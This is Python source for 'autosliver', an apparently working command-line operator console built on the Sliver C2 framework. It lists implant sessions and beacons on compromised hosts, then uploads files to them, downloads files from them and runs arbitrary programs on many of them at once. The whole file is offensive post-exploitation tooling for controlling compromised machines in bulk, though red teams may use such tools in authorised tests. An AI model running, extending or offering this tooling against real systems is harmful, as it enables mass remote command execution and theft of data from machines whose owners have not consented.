import sliver, asyncio, aiofiles, inspect
import argparse, yaml, shlex
import sys, os
from datetime import datetime, timezone
import gzip, io
from prompt_toolkit import print_formatted_text as print, HTML, ANSI, PromptSession, prompt
from prompt_toolkit.completion import WordCompleter
from prompt_toolkit.shortcuts import CompleteStyle, clear
import inquirer as inq
from termcolor import colored
from prettytable import PrettyTable, TableStyle
from html import escape as html_escape

# Argument parser
parser = argparse.ArgumentParser(description="A script to automate sliver C2 actions.")
parser.add_argument('--config', type=str, help="Config file path", default='autosliver.yaml')
args = parser.parse_args()

# Sliver setup
with open(args.config, 'r') as f:
    try:
        conf = yaml.safe_load(f)
    except yaml.YAMLError as e:
        error('Error reading yaml file')
        sys.exit(1)


class AutoSliverCLI:
    BANNER = r'''
               __               .__  .__                    
_____   __ ___/  |_  ____  _____|  | |__|__  __ ___________ 
\__  \ |  |  \   __\/  _ \/  ___/  | |  \  \/ // __ \_  __ \
 / __ \|  |  /|  | (  <_> )___ \|  |_|  |\   /\  ___/|  | \/
(____  /____/ |__|  \____/____  >____/__| \_/  \___  >__|   
     \/                       \/                   \/       
'''
    SELECT_MODE = 0
    INTERACT_MODE = 1
    CMD_COMPLETER = WordCompleter(["help", "exit"])

    def __init__(self, client):
        self.client = client
        self.sessions = []
        self.beacons = []
        self.targets = []
        self.interactions = []
        self.mode = self.SELECT_MODE

    def info(self, msg):
        print(HTML(f'<ansigreen>[*]</ansigreen> {msg}'))

    def error(self, msg):
        print(HTML(f'<ansired>[!]</ansired> {msg}'))

    def get_implants(self):
        return self.sessions + self.beacons
    
    async def update_implants(self):
        old_implants = self.sessions + self.beacons
        update = asyncio.gather(self.client.sessions(), self.client.beacons())
        self.sessions, self.beacons = await update

        for old in old_implants:
            found = False
            for new in self.get_implants():
                if old.ID == new.ID:
                    found = True
                    break
            if not found:
                self.error(f'Lost session {old.ID[:8]} {old.Name} - {old.RemoteAddress} ({old.Hostname}) {old.OS}/{old.Arch} - {self.time_to_string(old.LastCheckin)}')
                self.targets = [target for target in self.targets if target.ID != old.ID]
                self.interactions = [interaction for interaction in self.interactions if interaction._session.ID != old.ID]
        
        for new in self.get_implants():
            found = False
            for old in old_implants:
                if new.ID == old.ID:
                    found = True
                    break
            if not found:
                self.info(f'Session {new.ID[:8]} {new.Name} - {new.RemoteAddress} ({new.Hostname}) - {new.OS}/{new.Arch} - {self.time_to_string(new.LastCheckin)}')

    def time_to_string(self, time):
        return datetime.fromtimestamp(time, tz=timezone.utc).strftime('%a, %d %b %Y %H:%M:%S UTC')

    def pretty_print_remotes(self, type):
        match type:
            case 'session':
                implants = self.sessions
            case 'beacon':
                implants = self.beacons
            case 'interactive':
                implants = self.interactions
            case _:
                self.error('Unknown remote type')
                return
        
        if len(implants) == 0:
            self.info('None found 🙁')
            return
        
        table = PrettyTable()
        table.align = 'l'
        table.set_style(TableStyle.PLAIN_COLUMNS)
        table.field_names = [
            'ID',
            'Name',
            'Remote Address',
            'Hostname',
            'Username',
            'Operating System',
            'Last Message'
        ]
        table.sortby = 'Remote Address'

        if type == 'interactive':
            table.add_rows([
                [
                    implant._session.ID[:8],
                    implant._session.Name,
                    implant._session.RemoteAddress,
                    implant._session.Hostname,
                    implant._session.Username,
                    f'{implant._session.OS}/{implant._session.Arch}',
                    self.time_to_string(implant._session.LastCheckin)
                ] for implant in implants
            ])
        else:
            table.add_rows([
                [
                    implant.ID[:8],
                    implant.Name,
                    implant.RemoteAddress,
                    implant.Hostname,
                    implant.Username,
                    f'{implant.OS}/{implant.Arch}',
                    self.time_to_string(implant.LastCheckin)
                ] for implant in implants
            ])
        str = table.get_string()
        header = str[:str.index('\n')]
        body = str[str.index('\n'):]
        print(HTML(f'<b>{header}</b>{body}'))

    def get_cmds(self):
        cmds = set()
        names = dir(self.__class__)
        for name in names:
            if name[:3] == 'do_':
                cmds.add(name[3:])
        return sorted(cmds)
    
    async def do_sessions(self, args):
        'List current sessions'
        self.pretty_print_remotes('session')

    async def do_beacons(self, args):
        'List current beacons'
        self.pretty_print_remotes('beacon')
    
    async def do_use(self, args):
        'Select targets'

        # TODO: add a default/"Select all" option
        implants = self.get_implants()
        if len(implants) == 0:
            self.error('No implants found 🙁')
            return

        self.targets = inq.prompt([
            inq.Checkbox('targets', message='Select targets', choices=[
                (f'{implant.RemoteAddress} ({type(implant).__name__.lower()})', implant) for implant in implants
            ], default=self.targets)
        ])['targets']

    async def do_interact(self, args):
        'Interact with selected targets'
        implants = self.targets

        if len(implants) == 0:
            self.error('No targets selected')
            return
        
        async def process_interact(implant):
            if type(implant).__name__ == 'Beacon':
                interaction = await self.client.interact_beacon(implant.ID)
            elif type(implant).__name__ == 'Session':
                interaction = await self.client.interact_session(implant.ID)
            else:
                self.error('Invalid implant type')
                return None
            return interaction

        tasks = [asyncio.create_task(process_interact(implant)) for implant in implants]
        results = await asyncio.gather(*tasks)  # Run all tasks concurrently
        # Filter out None values (invalid implants)
        self.interactions.extend(filter(None, results))

        self.mode = self.INTERACT_MODE

    async def do_interactions(self, args):
        'List current interactions'

        if self.mode != self.INTERACT_MODE:
            self.error('Not in interactive mode')
            return
        
        self.pretty_print_remotes('interactive')
    
    async def do_upload(self, args):
        'Upload a file to all target'

        if self.mode != self.INTERACT_MODE:
            self.error(html_escape('Not in interactive mode'))
            return
        if len(args) < 1:
            self.error(html_escape('Missing arguments <filename> <upload_path>'))
            return
        if len(args) < 2:
            self.error(html_escape('Missing argument <upload_path>'))
            return
        
        filename = args[0]
        remote_path = args[1]
        self.info(f'Uploading {filename} to selected targets')
        with open(filename, 'rb') as f:
            data = f.read()
        
        async with asyncio.TaskGroup() as tg:
            for interaction in self.interactions:
                tg.create_task(interaction.upload(remote_path, data))

    async def do_download(self, args):
        'Download a file from all targets'

        async def process_download(interaction, filename):
            data = await interaction.download(filename)
    
            if data.Encoder == 'gzip':
                gzip_data = data.Data
                loop = asyncio.get_running_loop()
                
                # Decompress gzip data asynchronously
                decompressed_data = await loop.run_in_executor(None, decompress_gzip, gzip_data)
                
                # Write the decompressed data asynchronously
                output_filename = f'{interaction._session.RemoteAddress}-{os.path.basename(filename)}'
                async with aiofiles.open(output_filename, 'wb') as f:
                    await f.write(decompressed_data)
            else:
                print(f'Unsupported encoder: {data.Encoder}')

        def decompress_gzip(gzip_data):
            with gzip.GzipFile(fileobj=io.BytesIO(gzip_data), mode="rb") as f:
                return f.read()
    
        if self.mode != self.INTERACT_MODE:
            self.error('Not in interactive mode')
            return
        if len(args) < 1:
            self.error(html_escape('Missing argument <remote_path>'))
            return

        filename = args[0]
        self.info(f'Downloading {filename} from selected targets')
        
        tasks = [asyncio.create_task(process_download(interaction, filename)) for interaction in self.interactions]
        await asyncio.gather(*tasks)

    async def do_execute(self, args):
        'Execute a program on all targets'
        
        if self.mode != self.INTERACT_MODE:
            self.error('Not in interactive mode')
            return
        if len(self.interactions) == 0:
            self.error('No interactions selected')
            return
        if len(args) < 1:
            self.error(html_escape('Missing argument(s) <command>'))
            return
        
        async def process_execute(interaction, args):
            res = await interaction.execute(exe=args[0], args=args[1:], output=True)
            self.info(f'Output from {interaction._session.RemoteAddress}:')
            print(res.Stdout.decode())
        
        self.info(f'Executing command on selected targets\n')
        
        tasks = [asyncio.create_task(process_execute(interaction, args)) for interaction in self.interactions]
        await asyncio.gather(*tasks)  # Run all tasks concurrently

    
    def do_clear(self, args):
        'Clear the screen'
        clear()

    # TODO: figure out a way to separate interactive commands
    # TODO: help for a specific command
    def do_help(self, args):
        'Print this help message'
        print('Commands:')
        print('=========')
        cmds = self.get_cmds()
        for cmd in cmds:
            doc = getattr(self, 'do_' + cmd).__doc__
            if doc is None:
                doc = ''
            print(f'  {cmd}'.ljust(18) + doc)
    
    def do_exit(self, args):
        'Exit current mode or program'
        match self.mode:
            case self.SELECT_MODE:
                self.info('Goodbye!\n')
                raise asyncio.CancelledError
            case self.INTERACT_MODE:
                self.info('Exiting interactive mode')
                self.mode = self.SELECT_MODE
                self.interactions = []

    def get_prompt(self):
        prompt = '\n<u>autosliver</u> '
        if self.mode == self.INTERACT_MODE:
            prompt += f'(<ansiyellow>INTERACTIVE</ansiyellow>) '
        prompt += '> '
        return HTML(prompt)
    
    async def loop(self):
        print(ANSI(colored(self.BANNER, "blue")))   # HTML() doesn't like the backslashes
        update = asyncio.gather(self.client.sessions(), self.client.beacons())
        self.sessions, self.beacons = await update

        cli = PromptSession(message=self.get_prompt, completer=self.CMD_COMPLETER, complete_style=CompleteStyle.READLINE_LIKE)
        try:
            while True:
                # Get command
                cmd = await cli.prompt_async()
                cmd = shlex.split(cmd)
                print()
                if len(cmd) == 0:
                    continue
                if cmd[0] in self.get_cmds():
                    c = getattr(self, 'do_' + cmd[0])
                    # Run command
                    try:
                        if inspect.iscoroutinefunction(c):
                            await c(cmd[1:])
                        else:
                            c(cmd[1:])
                    except Exception as e:
                        self.error(f'Error running command: {e}')
                else:
                    self.error(f'Unknown command: {cmd[0]}')
        except KeyboardInterrupt:
            self.info("Exiting...\n")
            raise asyncio.CancelledError

    async def update(self):
        await asyncio.sleep(5)
        while True:
            async with asyncio.TaskGroup() as tg:
                tg.create_task(self.update_implants())
                tg.create_task(asyncio.sleep(5))


async def main():
    # Create sliver client
    config = sliver.SliverClientConfig.parse_config_file(conf['client_config'])
    client = sliver.SliverClient(config)
    
    # Connect client to sliver server
    cli = AutoSliverCLI(client)
    cli.info('Connecting to sliver server...')
    await client.connect()
    cli.info('Connected!')

    try:
        await asyncio.gather(cli.loop(), cli.update())
    except asyncio.CancelledError:
        sys.exit(0)


if __name__ == '__main__':
    asyncio.run(main())